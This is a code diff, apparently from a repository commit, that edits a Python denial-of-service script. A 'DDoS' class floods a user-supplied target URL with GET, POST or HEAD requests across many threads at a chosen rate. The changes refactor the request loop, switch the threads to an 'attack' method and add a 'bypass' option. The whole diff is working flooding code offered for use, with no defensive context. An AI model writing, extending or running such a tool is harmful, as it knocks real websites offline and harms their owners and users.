@@ -22,7 +22,6 @@ print('''
       |                    |
 ''')
 
-
 sys.setrecursionlimit(10000) # Increase the recursion limit
 
 class DDoS:
@@ -47,7 +46,6 @@ class DDoS:
                 else:
                     print("Method not supported.")
                     return
-                parse(self, requests.get(self.url))
                 time.sleep(1/self.pps) # Sleep time depends on pps
             except requests.exceptions.RequestException as e:
                 print('Error:', e)
@@ -60,18 +58,18 @@ class DDoS:
         while True:
             try:
                 response = requests.get(self.url)
-                parse(self, response)
+                self.parse(response)
                 time.sleep(1/self.pps) # Sleep time depends on pps
             except requests.exceptions.RequestException as e:
                 print('Error:', e)
 
-def parse(self, response):
-    current_time = datetime.now().strftime("%H:%M:%S")
-    print(f'{current_time} DDoS Attack: {response.url}')
+    def parse(self, response):
+        current_time = datetime.now().strftime("%H:%M:%S")
+        print(f'{current_time} DDoS Attack: {response.url}')
 
 def main():
     target_url = input('Enter Target URL: ')
-    method = input('Enter Method (GET/POST/HEAD/flood_get): ')
+    method = input('Enter Method (GET/POST/HEAD/flood_get/bypass): ')
     number_of_threads = int(input('Enter Number of Threads: '))
     pps = int(input('Enter Packets per Second: '))
 
@@ -87,7 +85,7 @@ def main():
 
     threads = []
     for _ in range(number_of_threads):
-        thread = threading.Thread(target=ddos.flood_get)
+        thread = threading.Thread(target=ddos.attack)
         threads.append(thread)
         thread.start()
 
@@ -96,3 +94,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+       
